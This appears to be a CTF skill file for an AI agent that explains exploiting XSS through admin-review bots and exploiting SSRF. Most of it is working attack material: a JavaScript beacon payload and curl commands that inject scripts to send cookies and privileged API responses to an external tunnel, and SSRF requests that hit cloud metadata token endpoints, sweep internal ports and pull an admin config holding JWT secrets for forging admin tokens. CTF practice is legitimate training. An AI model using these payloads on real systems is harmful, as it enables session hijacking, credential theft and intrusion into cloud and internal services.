# XSS-with-bot and SSRF

**First decide which XSS you have — the tooling is different:**
- **Flag is client-side and fires in *your* view** (DOM/reflected XSS, flag in DOM/`localStorage`/a JS var): you need a JS-executing client to confirm execution and read it out → `browser.md`. curl can't tell "executed" from "merely reflected."
- **A privileged bot visits your payload** (the section below): the exploit fires in *the lab's* browser, not yours. Use curl + tunnel + listener. The browser pane can only pre-flight that your payload page renders.

## H. XSS + admin bot — report / submit-for-review features

Applies when there's an "admin reviews your submission" workflow, a report link, or a contact form.

### Collector FIRST — before the first payload

The instant you read "an admin/operator/reviewer will open your submission", start the
collector. It is a fixed ~30s cost and it is the only channel you can *trust*:

```bash
python C:/Users/shawn/.claude/skills/ctf/scripts/oob.py --name <challenge>   # prints OOB_URL=
grep -a 'HIT\|FLAG' /c/Tools/CTF/<challenge>/oob.log
```

**Do not adopt the app's own in-app channel as your exfil path.** Vaultly-010 had a "Preview
beacons" panel that read exactly like the intended receiver — `GET /api/sandbox/hits` returning
`{query, body}` — and it never fired once across four review cycles while the same payloads were
provably executing and beaconing to a tunnel. Two blind polls on it (3 min + 5 min) cost the
solve. In-app beacon panels are frequently decoration or dead lab scaffolding.

**Never poll a silent channel longer than 60s.** Silence past a minute means the wrong channel,
not a slow bot. Change the channel; don't extend the wait.

### One payload, every channel, all tagged

A single round trip should tell you *which* channel lives and *whether* the bot ran at all —
never spend a review cycle testing one transport:

```html
<script>
var OOB = "https://<tunnel>";                       // external collector
var SELF = location.origin + location.pathname;     // in-app channel, if any
function send(tag, data) {
  var q = "?tag=" + encodeURIComponent(tag) + "&d=" + encodeURIComponent(String(data).slice(0,1200));
  try { navigator.sendBeacon(OOB + "/sb?tag=" + encodeURIComponent(tag), String(data).slice(0,1200)); } catch(e){}
  try { new Image().src = OOB + "/i" + q; } catch(e){}
  try { fetch(OOB + "/f" + q, {mode:"no-cors", keepalive:true}); } catch(e){}
  try { new Image().src = SELF + q; } catch(e){}
}
// ALWAYS send this first — it separates "bot never ran" from "exfil channel wrong",
// and location/origin tells you what the bot actually resolves the host to.
send("alive", location.href + " | ua=" + navigator.userAgent + " | ck=" + document.cookie);
["https://api.target/api/hq/recovery", "/api/flag"].forEach(function (u, i) {
  fetch(u, {credentials: "include"})
    .then(function (r) { return r.text().then(function (t) { send("R" + i + "_" + r.status, t); }); })
    .catch(function (e) { send("R" + i + "_ERR", e && e.message); });   // errors too — a block is data
});
</script>
```

The `alive` beacon is the highest-value line in the payload. On Vaultly-010 it revealed the bot
was headless Chrome on **`http://localhost:3001`**, not the advertised public hostname — which
explains which fetches are same-origin vs cross-origin, and therefore which need CORS at all.

```bash
# tunnel first — see the note below on ngrok vs cloudflared
/c/Tools/cloudflared.exe tunnel --url http://localhost:8080 &

# basic cookie steal
curl -si -X POST <target>/api/report $AUTH_HEADER -H 'Content-Type: application/json' \
  -d '{"content":"<script>fetch(\"https://<tunnel-url>/?c=\"+document.cookie)</script>"}'

# img onerror (bypasses script-tag filters)
curl -si -X POST <target>/api/report $AUTH_HEADER -H 'Content-Type: application/json' \
  -d '{"content":"<img src=x onerror=\"fetch('"'"'https://<tunnel-url>/?c='"'"'+document.cookie)\">"}'

# exfiltrate a privileged response body (works around HttpOnly)
curl -si -X POST <target>/api/report $AUTH_HEADER -H 'Content-Type: application/json' \
  -d '{"content":"<script>fetch(\"/api/flag\").then(r=>r.text()).then(t=>fetch(\"https://<tunnel-url>/?d=\"+btoa(t)))</script>"}'
```

**Use cloudflared, not ngrok, for anything a real browser loads.** ngrok's free tier serves an interstitial HTML page to browser-like requests unless a custom header is present, and a `<script src>` can't send one — this silently broke a working exploit chain on FurHire-013 while curl tests passed. Reserve ngrok for server-side OOB callbacks (SSRF pings).

Precisely: the interstitial hits requests that look like **navigations** (`Accept: text/html`) —
`<script src>`, top-level redirects, `window.open`. Sub-resource and background transports
(`sendBeacon`, `fetch`, `new Image()`) do get through, which is why ngrok worked on Vaultly-010.
`oob.py` defaults to cloudflared anyway so the distinction never has to be remembered under time
pressure; `--tunnel ngrok` is the fallback if cloudflared is slow to come up.

Cookie arrives → set it as `$AUTH_HEADER` and re-probe everything.

## I. SSRF — URL or callback params

**Reach for the script first — it does the whole chain including the read primitive below:**

```bash
python ~/.claude/skills/ctf/scripts/ssrfget.py --base <target> --token "$TOKEN" --sweep
python ~/.claude/skills/ctf/scripts/ssrfget.py --base <target> --token "$TOKEN" /admin/config
```

### Read the error messages — they tell you if loopback is allowed

Two *different* rejections mean an allowlist, and an allowlist that treats loopback
specially means the SSRF is intended:

| Response to | Message | Means |
|---|---|---|
| `http://169.254.169.254/`, `https://example.com/` | `Only internal image hosts are allowed` | rejected at validation |
| `http://127.0.0.1/` | `Could not fetch image from URL` | **passed validation, just nothing on :80** |
| `file:///etc/passwd` | `Only http(s) URLs are allowed` | scheme filter, separate check |

The second row is the green light. Sweep ports before concluding the SSRF is dead.

### The importer probably *stored* what it fetched — that's an arbitrary read

Avatar imports, image fetchers, PDF renderers and webhook testers commonly save the
fetched body and hand back its URL. Blind SSRF becomes a full read: trigger, then GET
the artifact. It will happily store HTML/JSON under an image extension.

```bash
curl -si -X POST <target>/api/profile/avatar/import $AUTH_HEADER -H 'Content-Type: application/json' \
  -d '{"url":"http://127.0.0.1:3000/admin/config"}'
# -> {"avatar_url":"/uploads/avatars/<md5>.txt"}
curl -s <target>/uploads/avatars/<md5>.txt        # <- the internal response body
```

Always check the response for *any* path-shaped value (`avatar_url`, `file`, `path`,
`location`) before assuming the SSRF is blind and reaching for OOB.

### "Only the app's own port is open" is not a dead end

A loopback sweep that finds only :3000 (the app itself) looks like nothing — but
middleware that trusts loopback puts internal APIs on the **same port** behind an
external-only 403. Enumerate *paths* on it, not just ports:

```bash
# externally: 403 Forbidden.  via SSRF from loopback: full config + secrets
curl -si <target>/admin/config                        # {"error":"Forbidden"}
# through the SSRF -> {"service":"...","jwt_secret":"...","flag":"bug{...}"}
```

Try `/admin`, `/admin/config`, `/internal`, `/debug`, `/metrics`, `/actuator/env`.
A root path that returns a service banner (`{"service":...,"endpoints":[...]}`) hands
you the rest of the map. Grab `jwt_secret`/config values even after the flag lands —
they forge admin tokens for follow-up objectives.

```bash
# localhost
curl -si -X POST <target>/api/<endpoint> $AUTH_HEADER -H 'Content-Type: application/json' \
  -d '{"url":"http://127.0.0.1/"}'

# internal port sweep
for port in 80 443 8080 8443 3000 3306 5432 6379 9200; do
  echo "=== $port ==="
  curl -si -X POST <target>/api/<endpoint> $AUTH_HEADER -H 'Content-Type: application/json' \
    -d "{\"url\":\"http://127.0.0.1:$port/\"}"
done

# cloud metadata
curl -si -X POST <target>/api/<endpoint> $AUTH_HEADER -H 'Content-Type: application/json' \
  -d '{"url":"http://169.254.169.254/latest/meta-data/"}'
curl -si -X POST <target>/api/<endpoint> $AUTH_HEADER -H 'Content-Type: application/json' \
  -d '{"url":"http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"}'

# confirm OOB first, before probing internal
curl -si -X POST <target>/api/<endpoint> $AUTH_HEADER -H 'Content-Type: application/json' \
  -d '{"url":"https://<ngrok-url>/ssrf-test"}'
```
